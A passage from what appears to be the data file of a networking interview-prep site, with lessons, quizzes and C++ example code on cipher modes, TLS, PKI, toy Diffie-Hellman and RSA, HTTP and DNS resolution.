encryption</td></tr><tr><td>CTR</td><td>Counter encrypted, XORed with plaintext</td><td>Yes</td><td>Nonce</td><td>Secure, fast, parallelizable</td></tr><tr><td>GCM</td><td>CTR + authentication tag (GMAC)</td><td>Yes</td><td>Nonce</td><td><b>Best — authenticated encryption (AEAD)</b></td></tr></table><div class="learn-code">ECB Problem (the "ECB penguin"):\n  Block1 = "ATTACK AT DAWN" → Cipher_X\n  Block2 = "ATTACK AT DAWN" → Cipher_X  (same plaintext = same ciphertext!)\n  Pattern is preserved — an image encrypted with ECB retains its outline.\n\nCBC: C_i = E(P_i XOR C_{i-1}), where C_0 = IV\n  Identical plaintext blocks produce different ciphertext (due to chaining).\n\nCTR: C_i = P_i XOR E(Nonce || Counter_i)\n  Effectively turns a block cipher into a stream cipher.\n\nGCM: CTR mode + GHASH authentication tag\n  Provides both confidentiality AND integrity (AEAD).</div><div class="learn-warn"><b>IV Requirements:</b> CBC requires a random, unpredictable IV for each message. CTR/GCM require a unique nonce per message (can be a counter). Reusing a nonce in CTR/GCM completely breaks security — XORing two ciphertexts cancels the key stream, revealing plaintext XOR.</div></div><div class="learn-section"><div class="learn-h">TLS 1.2 vs TLS 1.3</div><table class="learn-table"><tr><th>Feature</th><th>TLS 1.2</th><th>TLS 1.3</th></tr><tr><td>Handshake RTTs</td><td>2-RTT</td><td>1-RTT (0-RTT resumption available)</td></tr><tr><td>Key exchange</td><td>RSA, DHE, ECDHE</td><td>ECDHE only (forward secrecy mandatory)</td></tr><tr><td>Symmetric ciphers</td><td>AES-CBC, AES-GCM, RC4, 3DES</td><td>AES-GCM, ChaCha20-Poly1305 only (AEAD)</td></tr><tr><td>Hash functions</td><td>MD5, SHA-1, SHA-256</td><td>SHA-256, SHA-384 only</td></tr><tr><td>Forward secrecy</td><td>Optional (only with DHE/ECDHE)</td><td>Mandatory (static RSA removed)</td></tr><tr><td>0-RTT</td><td>Not supported</td><td>Supported (with replay risk)</td></tr><tr><td>Cipher suites</td><td>37+ (many insecure)</td><td>5 (all secure)</td></tr></table><div class="learn-code">TLS 1.2 Handshake (2-RTT):\n  Client → Server: ClientHello (ciphers, random)\n  Server → Client: ServerHello, Certificate, ServerKeyExchange, Done\n  Client → Server: ClientKeyExchange, ChangeCipherSpec, Finished\n  Server → Client: ChangeCipherSpec, Finished\n  [2 round trips before encrypted data]\n\nTLS 1.3 Handshake (1-RTT):\n  Client → Server: ClientHello + KeyShare (ECDHE public key)\n  Server → Client: ServerHello + KeyShare + EncryptedExtensions\n                   + Certificate + CertificateVerify + Finished\n  Client → Server: Finished\n  [1 round trip — client sends key share immediately]\n\n0-RTT Resumption (TLS 1.3):\n  Client sends early data with the first message using a PSK\n  from a previous session. Risk: 0-RTT data is replayable.</div></div><div class="learn-section"><div class="learn-h">PKI &amp; Certificate Chains</div><p class="learn-p"><b>Public Key Infrastructure (PKI)</b> is the framework of policies, procedures, and technology for managing digital certificates and public keys.</p><p class="learn-p"><b>CA Hierarchy:</b></p><div class="learn-code">Certificate Authority Hierarchy:\n\nRoot CA (self-signed, pre-installed in browser/OS trust store)\n  |\n  +-- Intermediate CA (signed by Root CA)\n        |\n        +-- Server Certificate (signed by Intermediate CA)\n              Contains: domain name, public key, validity dates,\n              issuer, serial number, signature algorithm\n\nWhy intermediates? Root CA private keys are kept offline in HSMs.\nIntermediate CAs handle daily issuance. If an intermediate is\ncompromised, only it is revoked — not the entire root.</div><p class="learn-p"><b>How browsers verify certificates:</b></p><ol class="learn-list"><li>Server sends its certificate + intermediate CA certificate(s).</li><li>Browser checks: is the server cert signed by the intermediate CA? Verify signature using intermediate CA\'s public key.</li><li>Is the intermediate CA cert signed by a trusted root CA? Verify using root CA\'s public key (pre-installed in OS/browser).</li><li>Check validity dates (not expired), domain name matches, and revocation status (CRL or OCSP).</li><li>If all checks pass, the certificate is trusted.</li></ol><p class="learn-p"><b>Certificate Pinning:</b> The application hardcodes (pins) the expected certificate or public key hash. Even if a CA is compromised and issues a fraudulent certificate, the app rejects it because the pin does not match. Used in mobile apps and high-security systems. Downside: operational complexity when rotating certificates.</p></div><div class="learn-section"><div class="learn-h">Common Crypto Mistakes in Interviews</div><ul class="learn-list"><li><b>Confusing encryption with hashing:</b> Encryption is reversible (with the key); hashing is one-way. You encrypt data for confidentiality; you hash for integrity/authentication.</li><li><b>Saying "RSA encrypts data in TLS":</b> In modern TLS (1.3), RSA is NOT used for key exchange. ECDHE is used. RSA may only be used for signing the certificate.</li><li><b>Forgetting forward secrecy:</b> Static RSA key exchange means if the server key is compromised, all past recorded sessions can be decrypted. ECDHE provides forward secrecy (ephemeral keys).</li><li><b>Confusing authentication and encryption:</b> Encryption hides data; authentication proves identity. A digital signature provides authentication + integrity + non-repudiation, NOT confidentiality.</li><li><b>Saying "HTTPS is slow":</b> With TLS 1.3 (1-RTT), HTTP/2 multiplexing, and hardware AES-NI acceleration, the overhead is negligible. Session resumption with 0-RTT makes it even faster.</li><li><b>Not knowing key counts:</b> For n parties, symmetric encryption needs n(n-1)/2 keys; asymmetric needs 2n keys (one pair each).</li></ul></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Walk through the Diffie-Hellman key exchange with a numerical example.</b><br>A: Both parties agree on a prime p=23 and generator g=5. Alice picks secret a=6, computes A=5^6 mod 23=8, sends A. Bob picks secret b=15, computes B=5^15 mod 23=19, sends B. Alice computes s=19^6 mod 23=2. Bob computes s=8^15 mod 23=2. Both get shared secret 2. An eavesdropper sees g, p, A, B but cannot compute s without solving the discrete logarithm problem.</p><p class="learn-p"><b>Q2: Explain RSA key generation and why it works.</b><br>A: Choose primes p, q. Compute n=pq, phi(n)=(p-1)(q-1). Pick e coprime to phi(n). Compute d=e^-1 mod phi(n). Public key (e,n), private key (d,n). Encrypt: C=M^e mod n. Decrypt: M=C^d mod n. Works because of Euler\'s theorem: M^(ed) = M^(1+k*phi(n)) = M * (M^phi(n))^k = M*1^k = M (mod n).</p><p class="learn-p"><b>Q3: Describe the four AES round operations and their purpose.</b><br>A: SubBytes provides confusion via S-box substitution (non-linear). ShiftRows cyclically shifts rows for inter-column diffusion. MixColumns multiplies each column by a polynomial for intra-column diffusion. AddRoundKey XORs state with the round key. The final round skips MixColumns. Together, these achieve Shannon\'s confusion and diffusion principles.</p><p class="learn-p"><b>Q4: Why is ECB mode insecure and what should you use instead?</b><br>A: ECB encrypts each block independently — identical plaintext blocks produce identical ciphertext, revealing patterns. The ECB penguin demonstrates this: an encrypted image retains the original outline. Use GCM (best — provides authenticated encryption), CTR (parallelizable), or CBC (sequential but well-understood).</p><p class="learn-p"><b>Q5: What are the key differences between TLS 1.2 and TLS 1.3?</b><br>A: TLS 1.3 reduces the handshake from 2-RTT to 1-RTT by sending key shares in ClientHello. It removes insecure algorithms (RSA key exchange, CBC ciphers, MD5, SHA-1, RC4, 3DES). Forward secrecy is mandatory (ECDHE only). Only AEAD ciphers (AES-GCM, ChaCha20-Poly1305) are allowed. 0-RTT resumption is supported but has replay risks.</p><p class="learn-p"><b>Q6: How does certificate pinning work and when would you use it?</b><br>A: Certificate pinning hardcodes the expected certificate\'s public key hash in the application. During TLS, the app checks if the server\'s certificate matches the pin. Even if a rogue CA issues a valid certificate for the domain, it will be rejected because the public key hash won\'t match. Used in mobile banking apps and high-security systems. Downside: certificate rotation requires app updates.</p></div>',
          code: `// === Cryptography — Simplified DH & RSA with Modular Exponentiation in C++ ===
#include <iostream>
#include <cmath>
#include <cstdint>
using namespace std;

// --- Modular exponentiation (base^exp mod mod) using repeated squaring ---
// This is the core operation for both DH and RSA.
// Time complexity: O(log(exp)) multiplications
long long modPow(long long base, long long exp, long long mod) {
    long long result = 1;
    base %= mod;
    while (exp > 0) {
        if (exp & 1) {            // if exp is odd
            result = (result * base) % mod;
        }
        exp >>= 1;                // exp = exp / 2
        base = (base * base) % mod;
    }
    return result;
}

// --- GCD using Euclidean algorithm ---
long long gcd(long long a, long long b) {
    while (b != 0) {
        long long t = b;
        b = a % b;
        a = t;
    }
    return a;
}

// --- Extended Euclidean Algorithm ---
// Returns gcd, and sets x, y such that a*x + b*y = gcd(a,b)
long long extGcd(long long a, long long b, long long &x, long long &y) {
    if (b == 0) {
        x = 1; y = 0;
        return a;
    }
    long long x1, y1;
    long long g = extGcd(b, a % b, x1, y1);
    x = y1;
    y = x1 - (a / b) * y1;
    return g;
}

// --- Modular multiplicative inverse: a^(-1) mod m ---
long long modInverse(long long a, long long m) {
    long long x, y;
    long long g = extGcd(a, m, x, y);
    if (g != 1) return -1; // inverse doesn't exist
    return (x % m + m) % m;
}

// --- Diffie-Hellman Key Exchange Simulation ---
void demoDiffieHellman() {
    cout << "=== Diffie-Hellman Key Exchange ===" << endl;
    long long p = 23;  // public prime
    long long g = 5;   // public generator

    // Alice's secret
    long long a = 6;
    long long A = modPow(g, a, p); // A = g^a mod p = 5^6 mod 23 = 8

    // Bob's secret
    long long b = 15;
    long long B = modPow(g, b, p); // B = g^b mod p = 5^15 mod 23 = 19

    // Shared secret computation
    long long secretAlice = modPow(B, a, p); // B^a mod p
    long long secretBob   = modPow(A, b, p); // A^b mod p

    cout << "  Public: p=" << p << ", g=" << g << endl;
    cout << "  Alice: secret a=" << a << ", sends A=g^a mod p=" << A << endl;
    cout << "  Bob:   secret b=" << b << ", sends B=g^b mod p=" << B << endl;
    cout << "  Alice computes: B^a mod p = " << secretAlice << endl;
    cout << "  Bob computes:   A^b mod p = " << secretBob << endl;
    cout << "  Shared secret match: " << (secretAlice == secretBob ? "YES" : "NO") << endl;

    // Demonstrate with larger values
    cout << "\\n  --- Larger example ---" << endl;
    long long p2 = 7919; // larger prime
    long long g2 = 7;
    long long a2 = 123, b2 = 456;
    long long A2 = modPow(g2, a2, p2);
    long long B2 = modPow(g2, b2, p2);
    long long s1 = modPow(B2, a2, p2);
    long long s2 = modPow(A2, b2, p2);
    cout << "  p=" << p2 << ", g=" << g2 << endl;
    cout << "  A=" << A2 << ", B=" << B2 << endl;
    cout << "  Shared secret: " << s1 << " (match: " << (s1 == s2 ? "YES" : "NO") << ")" << endl;
}

// --- RSA Simulation ---
void demoRSA() {
    cout << "\\n=== RSA Algorithm ===" << endl;

    // Key generation
    long long p = 61, q = 53;
    long long n = p * q;             // 3233
    long long phi = (p-1) * (q-1);   // 3120
    long long e = 17;                // public exponent, gcd(17, 3120) = 1

    cout << "  Key Generation:" << endl;
    cout << "    p=" << p << ", q=" << q << endl;
    cout << "    n = p*q = " << n << endl;
    cout << "    phi(n) = (p-1)(q-1) = " << phi << endl;
    cout << "    e = " << e << " (gcd(e, phi) = " << gcd(e, phi) << ")" << endl;

    long long d = modInverse(e, phi); // 2753
    cout << "    d = e^(-1) mod phi = " << d << endl;
    cout << "    Verify: e*d mod phi = " << (e * d) % phi << " (should be 1)" << endl;
    cout << "    Public key:  (e=" << e << ", n=" << n << ")" << endl;
    cout << "    Private key: (d=" << d << ", n=" << n << ")" << endl;

    // Encrypt and decrypt
    long long message = 65;
    long long ciphertext = modPow(message, e, n);
    long long decrypted  = modPow(ciphertext, d, n);

    cout << "\\n  Encryption/Decryption:" << endl;
    cout << "    Plaintext M = " << message << endl;
    cout << "    Ciphertext C = M^e mod n = " << ciphertext << endl;
    cout << "    Decrypted  M = C^d mod n = " << decrypted << endl;
    cout << "    Match: " << (message == decrypted ? "YES" : "NO") << endl;

    // Sign and verify (using private key to sign, public to verify)
    long long signature = modPow(message, d, n); // sign with private key
    long long verified  = modPow(signature, e, n); // verify with public key
    cout << "\\n  Digital Signature:" << endl;
    cout << "    Signature = M^d mod n = " << signature << endl;
    cout << "    Verified  = S^e mod n = " << verified << endl;
    cout << "    Valid: " << (message == verified ? "YES" : "NO") << endl;
}

int main() {
    demoDiffieHellman();
    demoRSA();

    // Modular exponentiation examples
    cout << "\\n=== Modular Exponentiation Examples ===" << endl;
    cout << "  2^10 mod 1000 = " << modPow(2, 10, 1000) << endl;
    cout << "  3^13 mod 7    = " << modPow(3, 13, 7) << endl;
    cout << "  7^256 mod 13  = " << modPow(7, 256, 13) << endl;

    // Key count comparison
    cout << "\\n=== Key Count for n Parties ===" << endl;
    for (int n : {2, 5, 10, 50, 100}) {
        cout << "  n=" << n << ": Symmetric=" << n*(n-1)/2
             << " keys, Asymmetric=" << 2*n << " key pairs" << endl;
    }

    return 0;
}`,
          problems: [
            ['Diffie-Hellman Implementation','https://www.geeksforgeeks.org/implementation-diffie-hellman-algorithm/','Medium'],
            ['RSA Algorithm Step by Step','https://www.geeksforgeeks.org/rsa-algorithm-cryptography/','Medium'],
            ['Modular Exponentiation','https://www.geeksforgeeks.org/modular-exponentiation-power-in-modular-arithmetic/','Easy'],
            ['AES Encryption Explained','https://www.geeksforgeeks.org/advanced-encryption-standard-aes/','Medium'],
            ['TLS Handshake Process','https://www.geeksforgeeks.org/transport-layer-security-tls/','Medium'],
            ['Digital Certificates & PKI','https://www.geeksforgeeks.org/digital-signatures-certificates/','Easy'],
          ],
          mcqs: [
            {q: 'Diffie-Hellman key exchange is based on the difficulty of:', o: ['Integer factorization', 'Discrete logarithm problem', 'Elliptic curve problem', 'Knapsack problem'], a: 1},
            {q: 'In RSA, if p=11 and q=3, what is phi(n)?', o: ['33', '30', '20', '32'], a: 2},
            {q: 'AES-256 uses how many rounds of encryption?', o: ['10', '12', '14', '16'], a: 2},
            {q: 'Which AES operation is skipped in the final round?', o: ['SubBytes', 'ShiftRows', 'MixColumns', 'AddRoundKey'], a: 2},
            {q: 'In GCM mode, the authentication tag provides:', o: ['Confidentiality only', 'Integrity and authenticity', 'Key exchange', 'Compression'], a: 1},
            {q: 'TLS 1.3 removed which key exchange method?', o: ['ECDHE', 'DHE', 'Static RSA', 'X25519'], a: 2},
            {q: 'Reusing a nonce in CTR/GCM mode:', o: ['Has no effect', 'Slows encryption', 'Completely breaks security by revealing plaintext XOR', 'Changes the key'], a: 2},
            {q: 'Certificate pinning protects against:', o: ['DDoS attacks', 'Compromised CA issuing fraudulent certificates', 'Buffer overflow', 'SQL injection'], a: 1},
            {q: 'Basic Diffie-Hellman without authentication is vulnerable to:', o: ['Replay attacks', 'Man-in-the-middle attacks', 'Brute force', 'Side-channel attacks'], a: 1},
            {q: 'The commonly used RSA public exponent 65537 is popular because:', o: ['It is prime', 'It has only two bits set making modular exponentiation fast', 'It is the largest prime below 2^16', 'It was mandated by NIST'], a: 1},
          ],
        }
      ]
    },
    // ==================== TAB 7: Application Layer (OSI Layer 7) ====================
    {
      id: 'app', t: 'Application Layer',
      topics: [
        {
          t: 'HTTP/HTTPS & DNS',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">When you type <code>www.google.com</code> in your browser, DNS resolves the domain to an IP, TCP connects, TLS encrypts, and HTTP delivers the page. "What happens when you type a URL?" is the <b>most popular networking interview question</b>. Understanding HTTP methods, status codes, HTTP/2 multiplexing, DNS hierarchy, and TLS handshakes is essential for SDE interviews and system design rounds.</p></div><div class="learn-section"><div class="learn-h">HTTP (HyperText Transfer Protocol)</div><p class="learn-p"><b>HTTP</b> is the foundation of data communication on the World Wide Web. It is a <b>request-response</b> protocol operating at the Application Layer, using <b>TCP port 80</b> (or 443 for HTTPS). HTTP is <b>stateless</b> — each request is independent; the server does not retain information about previous requests (cookies and sessions add statefulness on top).</p></div><div class="learn-section"><div class="learn-h">HTTP Methods</div><table class="learn-table"><tr><th>Method</th><th>Purpose</th><th>Idempotent?</th><th>Safe?</th><th>Body?</th></tr><tr><td>GET</td><td>Retrieve resource</td><td>Yes</td><td>Yes</td><td>No</td></tr><tr><td>POST</td><td>Submit data / create resource</td><td>No</td><td>No</td><td>Yes</td></tr><tr><td>PUT</td><td>Replace resource entirely</td><td>Yes</td><td>No</td><td>Yes</td></tr><tr><td>PATCH</td><td>Partial update</td><td>No</td><td>No</td><td>Yes</td></tr><tr><td>DELETE</td><td>Remove resource</td><td>Yes</td><td>No</td><td>Optional</td></tr><tr><td>HEAD</td><td>GET without body (headers only)</td><td>Yes</td><td>Yes</td><td>No</td></tr><tr><td>OPTIONS</td><td>Supported methods (CORS preflight)</td><td>Yes</td><td>Yes</td><td>No</td></tr></table><p class="learn-p"><b>Idempotent:</b> Making the same request multiple times has the same effect as making it once. <b>Safe:</b> The request does not modify the resource.</p></div><div class="learn-section"><div class="learn-h">HTTP Status Codes</div><table class="learn-table"><tr><th>Range</th><th>Category</th><th>Common Codes</th></tr><tr><td>1xx</td><td>Informational</td><td>100 Continue, 101 Switching Protocols</td></tr><tr><td>2xx</td><td>Success</td><td>200 OK, 201 Created, 204 No Content</td></tr><tr><td>3xx</td><td>Redirection</td><td>301 Moved Permanently, 302 Found, 304 Not Modified</td></tr><tr><td>4xx</td><td>Client Error</td><td>400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 429 Too Many Requests</td></tr><tr><td>5xx</td><td>Server Error</td><td>500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable</td></tr></table></div><div class="learn-section"><div class="learn-h">HTTP Versions</div><p class="learn-p"><b>HTTP/1.0:</b> One request per TCP connection. Connection closed after each response. Very inefficient.</p><p class="learn-p"><b>HTTP/1.1:</b> <b>Persistent connections</b> (keep-alive by default). <b>Pipelining</b> (send multiple requests without waiting, but responses must be in order — causes head-of-line blocking). <b>Chunked transfer encoding</b>, <b>Host header</b> (virtual hosting).</p><p class="learn-p"><b>HTTP/2:</b> <b>Binary framing</b> (not text-based). <b>Multiplexing</b> (multiple streams over one TCP connection — no HOL blocking at HTTP level). <b>Header compression</b> (HPACK). <b>Server push</b>. <b>Stream prioritization</b>.</p><p class="learn-p"><b>HTTP/3:</b> Uses <b>QUIC</b> (over UDP instead of TCP). Eliminates TCP-level head-of-line blocking. Built-in TLS 1.3. Faster connection establishment (0-RTT). Still relatively new but growing adoption.</p><div class="learn-code">HTTP/1.1 Request:\nGET /index.html HTTP/1.1\nHost: www.example.com\nUser-Agent: Mozilla/5.0\nAccept: text/html\nConnection: keep-alive\n\nHTTP/1.1 Response:\nHTTP/1.1 200 OK\nContent-Type: text/html; charset=UTF-8\nContent-Length: 1234\nDate: Mon, 15 Jun 2026 10:00:00 GMT\n\n&lt;html&gt;...&lt;/html&gt;</div></div><div class="learn-section"><div class="learn-h">HTTPS and TLS</div><p class="learn-p"><b>HTTPS</b> is HTTP over <b>TLS (Transport Layer Security)</b>. It provides: <b>Encryption</b> (confidentiality), <b>Authentication</b> (server identity via certificates), and <b>Integrity</b> (data not tampered).</p><p class="learn-p"><b>TLS 1.2 Handshake:</b></p><ol class="learn-list"><li><b>ClientHello:</b> Client sends supported cipher suites, TLS version, random number.</li><li><b>ServerHello:</b> Server chooses cipher suite, sends its certificate (public key).</li><li><b>Key Exchange:</b> Client generates pre-master secret, encrypts with server\'s public key, sends it.</li><li><b>Both derive session keys</b> from the pre-master secret + random numbers.</li><li><b>Finished:</b> Both send encrypted "finished" messages to verify the handshake.</li></ol><p class="learn-p"><b>TLS 1.3:</b> Faster handshake (1-RTT instead of 2-RTT). Supports 0-RTT resumption. Removed insecure algorithms (RSA key exchange, CBC). Uses only AEAD ciphers.</p><div class="learn-tip"><b>Tip:</b> In interviews, know the difference between <b>symmetric</b> and <b>asymmetric</b> encryption. TLS uses asymmetric (RSA/ECDHE) for key exchange, then symmetric (AES) for bulk data encryption. Asymmetric is slow but solves the key distribution problem.</div></div><div class="learn-section"><div class="learn-h">DNS (Domain Name System)</div><p class="learn-p"><b>DNS</b> translates <b>domain names</b> (e.g., www.google.com) to <b>IP addresses</b> (e.g., 142.250.80.4). It is a <b>hierarchical, distributed</b> database system. DNS uses <b>UDP port 53</b> for queries (TCP for zone transfers and responses &gt; 512 bytes).</p></div><div class="learn-section"><div class="learn-h">DNS Hierarchy</div><div class="learn-code">Root Servers (.)               &larr; 13 root server clusters (a-m)\n   |\n   +-- TLD Servers (.com, .org, .net, .edu, .io, country codes)\n         |\n         +-- Authoritative Name Servers (google.com, example.com)\n               |\n               +-- Actual DNS records (A, AAAA, CNAME, MX, NS, etc.)</div><p class="learn-p"><b>DNS Record Types:</b></p><table class="learn-table"><tr><th>Type</th><th>Purpose</th><th>Example</th></tr><tr><td>A</td><td>Domain &rarr; IPv4</td><td>example.com &rarr; 93.184.216.34</td></tr><tr><td>AAAA</td><td>Domain &rarr; IPv6</td><td>example.com &rarr; 2606:2800:220:1:...</td></tr><tr><td>CNAME</td><td>Alias to another domain</td><td>www.example.com &rarr; example.com</td></tr><tr><td>MX</td><td>Mail server</td><td>example.com &rarr; mail.example.com (priority 10)</td></tr><tr><td>NS</td><td>Authoritative name server</td><td>example.com &rarr; ns1.example.com</td></tr><tr><td>TXT</td><td>Text record (SPF, DKIM, etc.)</td><td>example.com &rarr; "v=spf1 ..."</td></tr><tr><td>PTR</td><td>Reverse lookup (IP &rarr; Domain)</td><td>34.216.184.93 &rarr; example.com</td></tr><tr><td>SOA</td><td>Start of Authority (zone info)</td><td>Serial number, refresh interval, etc.</td></tr></table></div><div class="learn-section"><div class="learn-h">DNS Resolution Process</div><p class="learn-p">When you type <code>www.google.com</code> in a browser:</p><ol class="learn-list"><li><b>Browser cache:</b> Check if the domain was recently resolved.</li><li><b>OS cache:</b> Check the operating system\'s DNS cache.</li><li><b>Recursive resolver:</b> Query the ISP\'s (or configured, e.g., 8.8.8.8) recursive DNS resolver.</li><li><b>Root server:</b> Resolver queries a root server, which returns the TLD server for .com.</li><li><b>TLD server:</b> Returns the authoritative name server for google.com.</li><li><b>Authoritative server:</b> Returns the A record (IP address) for www.google.com.</li><li>Result is <b>cached</b> at each level with a <b>TTL (Time To Live)</b>.</li></ol><div class="learn-code">DNS Query Types:\n- Recursive: "Give me the final answer" (client to resolver)\n- Iterative: "Here\'s the next server to ask" (resolver to servers)\n\nTypical flow:\nClient --(recursive)--> Resolver\nResolver --(iterative)--> Root Server\nResolver --(iterative)--> TLD Server\nResolver --(iterative)--> Authoritative Server\nResolver --(answer)--> Client</div><div class="learn-warn"><b>Warning:</b> DNS queries are <b>unencrypted by default</b> (plaintext UDP). Anyone on the network can see which domains you are resolving. <b>DNS over HTTPS (DoH)</b> and <b>DNS over TLS (DoT)</b> encrypt DNS queries for privacy.</div></div><div class="learn-section"><div class="learn-h">What Happens When You Type a URL in the Browser?</div><p class="learn-p">This is one of the most popular interview questions. The complete answer involves:</p><ol class="learn-list"><li><b>URL parsing:</b> Browser parses protocol, domain, port, path.</li><li><b>DNS resolution:</b> Domain name resolved to IP address (as described above).</li><li><b>TCP connection:</b> 3-way handshake with the server.</li><li><b>TLS handshake:</b> If HTTPS, negotiate encryption parameters.</li><li><b>HTTP request:</b> Browser sends GET request with headers.</li><li><b>Server processing:</b> Server processes request, generates response.</li><li><b>HTTP response:</b> Server sends back status code, headers, and body (HTML).</li><li><b>Browser rendering:</b> Parse HTML, build DOM, load CSS/JS, render page.</li><li><b>Connection management:</b> Keep-alive for subsequent requests or close.</li></ol></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: What happens when you type https://www.google.com?</b><br>A: (1) Parse URL. (2) DNS resolution: browser cache, OS cache, recursive resolver queries root, .com TLD, google.com auth NS. (3) TCP 3-way handshake to IP:443. (4) TLS 1.3 handshake. (5) HTTP/2 GET / encrypted. (6) Server returns 200 OK + HTML. (7) Browser parses HTML, requests CSS/JS/images (multiplexed). (8) Browser renders DOM.</p><p class="learn-p"><b>Q2: HTTP/1.1 vs HTTP/2 vs HTTP/3?</b><br>A: HTTP/1.1: text-based, persistent connections, pipelining (HOL blocking). HTTP/2: binary framing, multiplexing, HPACK compression, server push. HTTP/3: QUIC over UDP, no TCP HOL blocking, built-in TLS 1.3, 0-RTT resumption, connection migration.</p><p class="learn-p"><b>Q3: DNS resolution with caching?</b><br>A: Caches at: browser, OS, resolver. On miss, resolver queries iteratively: Root, TLD (.com), Authoritative NS. Each record cached with its TTL.</p><p class="learn-p"><b>Q4: Is GET idempotent? Is POST? Why does it matter?</b><br>A: GET is idempotent (safe to retry). POST is not (may create duplicates). Matters for: browser retry behavior, caching (GET cacheable, POST not), API design (PUT for idempotent updates, POST for creation).</p><p class="learn-p"><b>Q5: 301 vs 302 redirect?</b><br>A: 301 = Moved Permanently (cached, SEO link equity transferred). 302 = Temporary (not cached, original URL used).</p><p class="learn-p"><b>Q6: Why does DNS primarily use UDP?</b><br>A: Queries are small (&lt;512 bytes), so TCP\'s 3-way handshake overhead is unnecessary. UDP\'s single-packet exchange is faster. TCP used for: zone transfers, responses &gt;512 bytes, DNS over TLS (DoT).</p></div>',
          code: `// === HTTP Client & DNS Resolver Simulation in C++ ===
// Using POSIX sockets for a basic HTTP GET and DNS concepts
#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include <map>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
using namespace std;

// ---- Simple HTTP GET Request using raw sockets ----
string httpGet(const string& host, const string& path, int port = 80) {
    // Step 1: Resolve hostname to IP
    struct hostent* server = gethostbyname(host.c_str());
    if (!server) {
        return "ERROR: DNS resolution failed for " + host;
    }

    // Step 2: Create TCP socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return "ERROR: Cannot create socket";

    // Step 3: Connect to server
    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    memcpy(&serverAddr.sin_addr.s_addr, server->h_addr, server->h_length);

    if (connect(sockfd, (struct sockaddr*)&serverAddr,
                sizeof(serverAddr)) < 0) {
        close(sockfd);
        return "ERROR: Connection failed";
    }

    // Step 4: Send HTTP GET request
    string request = "GET " + path + " HTTP/1.1\\r\\n"
                     "Host: " + host + "\\r\\n"
                     "Connection: close\\r\\n"
                     "User-Agent: SimpleClient/1.0\\r\\n"
                     "\\r\\n";
    send(sockfd, request.c_str(), request.size(), 0);

    // Step 5: Receive response
    string response;
    char buffer[4096];
    int bytesRead;
    while ((bytesRead = recv(sockfd, buffer, sizeof(buffer)-1, 0)) > 0) {
        buffer[bytesRead] = '\\0';
        response += buffer;
    }

    close(sockfd);
    return response;
}

// ---- DNS Cache Simulation ----
struct DNSRecord {
    string domain;
    string ip;
    string type; // A, AAAA, CNAME, MX
    int ttl;     // seconds
};

class DNSCache {
    map<string, DNSRecord> cache;
public:
    void addRecord(const string& domain, const string& ip,
                   const string& type, int ttl) {
        cache[domain] = {domain, ip, type, ttl};
    }

    string resolve(const string& domain) {
        if (cache.find(domain) != cache.end()) {
            cout << "  [Cache HIT] " << domain << " -> "
                 << cache[domain].ip << endl;
            return cache[domain].ip;
        }
        cout << "  [Cache MISS] " << domain << endl;
        return "";
    }

    void display() {
        cout << "\\n=== DNS Cache ===" << endl;
        cout << "Domain\\t\\t\\tType\\tIP\\t\\t\\tTTL" << endl;
        for (auto& [key, rec] : cache) {
            cout << rec.domain << "\\t" << rec.type << "\\t"
                 << rec.ip << "\\t\\t" << rec.ttl << "s" << endl;
        }
    }
};

// ---- DNS Resolution Simulation (iterative) ----
void simulateDNSResolution(const string& domain) {
    cout << "\\n=== Simulating DNS Resolution for " << domain
         << " ===" << endl;

    // Parse domain parts
    vector<string> parts;
    stringstream ss(domain);
    string part;
    while (getline(ss, part, '.')) parts.push_back(part);

    cout << "1. Check browser cache... MISS" << endl;
    cout << "2. Check OS cache (/etc/hosts)... MISS" << endl;
    cout << "3. Query recursive resolver (8.8.8.8)..." << endl;
    cout << "4. Resolver queries Root Server (.)" << endl;
    cout << "   Root: 'Try .com TLD at 192.5.6.30'" << endl;
    cout << "5. Resolver queries .com TLD Server" << endl;
    cout << "   TLD: 'Try " << parts[parts.size()-2] << ".com NS at 216.239.32.10'" << endl;
    cout << "6. Resolver queries Authoritative Server for "
         << domain << endl;
    cout << "   Auth: '" << domain << " A 142.250.80.4 (TTL=300)'" << endl;
    cout << "7. Resolver caches result, returns to client" << endl;
    cout << "8. Result: " << domain << " -> 142.250.80.4" << endl;
}

// ---- HTTP Request/Response Parser ----
void parseHTTPResponse(const string& raw) {
    cout << "\\n=== HTTP Response Parsing ===" << endl;

    // Find status line
    size_t firstLine = raw.find("\\r\\n");
    if (firstLine == string::npos) firstLine = raw.find("\\n");
    string statusLine = raw.substr(0, firstLine);
    cout << "Status Line: " << statusLine << endl;

    // Parse headers
    size_t headerEnd = raw.find("\\r\\n\\r\\n");
    if (headerEnd == string::npos) headerEnd = raw.find("\\n\\n");
    string headers = raw.substr(firstLine + 2, headerEnd - firstLine - 2);
    cout << "Headers:" << endl;

    stringstream hs(headers);
    string line;
    while (getline(hs, line)) {
        if (!line.empty() && line[0] != '\\r')
            cout << "  " << line << endl;
    }

    cout << "Body length: " << (raw.size() - headerEnd - 4) << " bytes" << endl;
}

// ---- URL Parser ----
void parseURL(const string& url) {
    cout << "\\n=== URL Parsing ===" << endl;
    cout << "URL: " << url << endl;

    // Protocol
    size_t protoEnd = url.find("://");
    string protocol = (protoEnd != string::npos) ?
                       url.substr(0, protoEnd) : "http";
    cout << "Protocol: " << protocol << endl;

    // Host + path
    size_t hostStart = (protoEnd != string::npos) ? protoEnd + 3 : 0;
    size_t pathStart = url.find('/', hostStart);
    string host = (pathStart != string::npos) ?
                   url.substr(hostStart, pathStart - hostStart) :
                   url.substr(hostStart);
    string path = (pathStart != string::npos) ? url.substr(pathStart) : "/";

    // Port
    size_t portPos = host.find(':');
    int port = (protocol == "https") ? 443 : 80;
    if (portPos != string::npos) {
        port = stoi(host.substr(portPos + 1));
        host = host.substr(0, portPos);
    }

    cout << "Host: " << host << endl;
    cout << "Port: " << port << endl;
